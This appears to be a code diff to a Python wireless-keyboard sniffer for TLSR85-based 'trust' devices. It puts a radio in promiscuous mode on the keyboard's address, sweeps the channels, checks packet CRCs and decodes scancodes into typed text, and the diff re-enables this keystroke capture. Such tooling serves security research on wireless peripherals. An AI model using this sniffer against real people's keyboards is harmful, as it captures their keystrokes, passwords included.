@@ -11,7 +11,6 @@ from lib import common
 from devices.TLSR85.tlsr85 import Tlsr85
 from devices.TLSR85.tlsr85_keyboard import Tlsr85Keyboard
 from devices.TLSR85.tlsr85_mouse import Tlsr85Mouse
-from devices.TLSR85.TLSR85_dongle import Tlsr85Dongle
 
 # TODO add flags (shift, alt, win, ...)
 SCANCODE = {
@@ -69,13 +68,12 @@ common.parse_and_init()
 
 trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80",22, 0x11021, 0x24bf, 2)
 trust_mouse = Tlsr85Mouse("4a:b4:cb", "dc",30, 0x11021, 0x24bf, 2)
-trust_dongle = Tlsr85Dongle("95:69:97", 16, 0x11021, 0x497e, 0xd397, 2)
 # base address for poss : "d5:54:cb"
 # crc init for poss: 0xcb01
 
 rate = Tlsr85.RATE
 # common.radio.enter_promiscuous_mode_generic(unhexlify(trust_keyboard.base_address.replace(':', '')), rate=rate)
-common.radio.enter_promiscuous_mode_generic(unhexlify(trust_dongle.base_address.replace(':', '')), rate=rate)
+common.radio.enter_promiscuous_mode_generic(unhexlify(trust_keyboard.base_address.replace(':', '')), rate=rate)
 
 # Sweep through the channels
 channels = Tlsr85.CHANNELS
@@ -99,26 +97,23 @@ while True:
 
     value = common.radio.receive_payload()
     if len(value) >= Tlsr85.BASE_ADDRESS_LENGTH:
-        # TODO check if base address then check for specific address
         found_base_address = bytes(value[:Tlsr85.BASE_ADDRESS_LENGTH]).hex()
-        print(found_base_address)
-        if found_base_address == trust_dongle.base_address.replace(':', ''):
-            print("Dongle ACK")
-        # found_specific_address = bytes(value[Tlsr85.BASE_ADDRESS_LENGTH:Tlsr85.FULL_ADDRESS_LENGTH]).hex()
-        #
-        # if found_specific_address == trust_keyboard.keyboard_address:
-        #     packet = trust_keyboard.parse_packet(value)
-        #     if trust_keyboard.check_crc(packet["crc"], packet["payload"]):
-        #         print(f"Keyboard packet\tCHANNEL : {channels[channel_index]}\n")
-        #         for items in packet["array"]:
-        #             if items in SCANCODE:
-        #                 entered_string += SCANCODE[items]
-        #         print(entered_string)
-        #         last_tune = time.time()
-        #
-        # elif found_specific_address == trust_mouse.mouse_address:
-        #     # TODO check the CRC and parse the input
-        #     t = ''
-        #     """ print(f"CHANNEL : {channels[channel_index]}\n")
-        #     last_tune = time.time() """
+        if found_base_address == trust_keyboard.base_address.replace(':', ''):
+            found_specific_address = bytes(value[Tlsr85.BASE_ADDRESS_LENGTH:Tlsr85.FULL_ADDRESS_LENGTH]).hex()
+            
+            if found_specific_address == trust_keyboard.keyboard_address:
+                packet = trust_keyboard.parse_packet(value)
+                if trust_keyboard.check_crc(packet["crc"], packet["payload"]):
+                    print(f"Keyboard packet\tCHANNEL : {channels[channel_index]}\n")
+                    for items in packet["array"]:
+                        if items in SCANCODE:
+                            entered_string += SCANCODE[items]
+                    print(entered_string)
+                    last_tune = time.time()
+            
+            elif found_specific_address == trust_mouse.mouse_address:
+                # TODO check the CRC and parse the input
+                t = ''
+                """ print(f"CHANNEL : {channels[channel_index]}\n")
+                last_tune = time.time() """
 
